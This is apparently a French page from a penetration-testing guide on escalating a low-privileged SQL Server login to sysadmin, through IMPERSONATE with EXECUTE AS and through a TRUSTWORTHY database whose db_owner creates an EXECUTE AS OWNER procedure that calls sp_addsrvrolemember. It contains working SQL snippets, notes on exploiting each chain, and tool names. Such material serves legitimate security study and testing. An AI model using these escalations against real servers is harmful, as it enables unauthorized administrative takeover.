---
order: 5
title: "Usurpation MSSQL : EXECUTE AS et TRUSTWORTHY vers sysadmin"
description: "Escalader à l'intérieur de SQL Server d'une connexion peu privilégiée vers sysadmin via la permission IMPERSONATE et EXECUTE AS, et via les bases TRUSTWORTHY avec un db_owner, les chaînes de propriété qui promeuvent un principal de base au rang d'administrateur du serveur."
keywords:
  - EXECUTE AS
  - IMPERSONATE
  - TRUSTWORTHY
  - db_owner
  - sysadmin
---

# Usurpation

Le modèle de privilèges de SQL Server comporte deux chaînes d'escalade bien rodées d'une connexion ordinaire vers **sysadmin**, toutes deux abusant de fonctionnalités fonctionnant comme prévu : la permission **IMPERSONATE** avec `EXECUTE AS`, et une base **TRUSTWORTHY** détenue par une connexion que vous contrôlez.

## EXECUTE AS une connexion plus privilégiée

Si vous détenez `IMPERSONATE` sur une autre connexion (fréquent par sur-octroi, et visible lors de l'[énumération](enumeration.md)), vous devenez tout simplement cette connexion :

```sql
-- find impersonable logins, then assume one; if it is sysadmin you are done
EXECUTE AS LOGIN = 'sa';
SELECT IS_SRVROLEMEMBER('sysadmin');   -- 1
-- chain impersonations where one principal can impersonate another toward sysadmin
```

## Base TRUSTWORTHY vers sysadmin

Si une base est **TRUSTWORTHY** et que vous en êtes `db_owner`, un module que vous créez avec `EXECUTE AS OWNER` s'exécute en tant que propriétaire de la base au niveau du **serveur**. Si ce propriétaire est un sysadmin (souvent `sa`), vous créez et exécutez une procédure qui vous ajoute au rôle sysadmin :

```sql
USE trustworthy_db;    -- is_trustworthy_on = 1 and you own it
CREATE PROCEDURE dbo.esc WITH EXECUTE AS OWNER AS
  EXEC sp_addsrvrolemember 'EXAMPLE\you', 'sysadmin';
EXEC dbo.esc;
```

## Notes d'exploitation

- Énumérez les deux conditions tôt : les connexions usurpables depuis `sys.server_principals`, et `is_trustworthy_on` avec le propriétaire de la base depuis `sys.databases`, afin de savoir quelle chaîne est disponible avant de toucher à l'exécution.
- La chaîne TRUSTWORTHY ne paie que lorsque le **propriétaire de la base est hautement privilégié** ; une base trustworthy détenue par un sysadmin est le jackpot.
- Atteindre sysadmin débloque l'[exécution de commandes](command-execution.md) et des sauts de lien propres, l'usurpation est donc généralement l'étape entre un point d'appui `public` et du code sur l'hôte.
- `PowerUpSQL` `Invoke-SQLAudit` / `Get-SQLServerPriv...` font ressortir les deux chaînes automatiquement.

## Outils

- **PowerUpSQL** (`Invoke-SQLAudit`, `Invoke-SQLEscalatePriv`) : trouver et exercer les chemins d'usurpation et TRUSTWORTHY.
- **Impacket `mssqlclient.py`** : exécuter `EXECUTE AS` et la procédure TRUSTWORTHY de manière interactive.

## Références

- [NetSPI: SQL Server TRUSTWORTHY and impersonation escalation](https://www.netspi.com/blog/technical-blog/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/)
- [PowerUpSQL (NetSPI)](https://github.com/NetSPI/PowerUpSQL)
- [Microsoft: EXECUTE AS (Transact-SQL)](https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql)
